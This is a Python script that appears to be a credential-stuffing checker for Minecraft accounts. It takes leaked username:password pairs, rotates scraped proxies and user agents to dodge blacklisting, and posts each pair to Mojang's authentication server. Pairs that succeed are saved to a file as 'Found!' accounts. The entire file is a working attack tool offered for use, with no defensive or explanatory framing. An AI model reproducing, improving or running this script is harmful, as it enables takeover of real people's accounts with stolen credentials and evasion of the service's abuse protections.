import requests
import threading
from proxyscrape import create_collector

collector = create_collector('proxyList', 'https')

def getProxy():
    response = str(collector.get_proxy())
    proxy  = response.split("'")[1]+":"+response.split("'")[3]
    proxyArg = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    return proxyArg

def getCreds(location):  #from a list, must be user:pass, can be email as well
    creds = location.pop().replace('\n', '').split(":")
    return creds

def getUA():
    agent = {'user-agent' : uaList.readline().replace('\n', '')}
    return agent

skipList = []
def sendReq(userpass):
    user = userpass[0]
    passw = userpass[-1]
    atProxy = getProxy()
    UA = getUA()
    print(f'Checking {user}:{passw} @ {atProxy["http"]}')
    try:
        r = requests.post('https://authserver.mojang.com/authenticate', json={
            "agent": {
                "name": "Minecraft",
                "version": 1
            },
            "username": user,
            "password": passw,
        }, proxies=atProxy, headers=UA)
        result = r.text
        if "ForbiddenOperationException" in result:
            print(result.split(',')[0].replace('"', '').replace('{', '') + '\n-------------------------------------------------')  # this means creds were wrong]

        elif 'The request could not be satisfied' in result:
            print('BLACKLISTED, SKIPPING ACCOUNT\n-------------------------------------------------')

        else:
            print(f'Found! {user}:{passw}\n-------------------------------------------------\n\n\n\n\n\n')
            output = open("//file//", 'a')
            output.write(f'\n{user}:{passw}')
            output.close()
            foundAccs.append(f'{user}:{passw}')
            print(foundAccs)
    except:
        print('proxy bad, trying again\n')
        skipList.append(userpass)
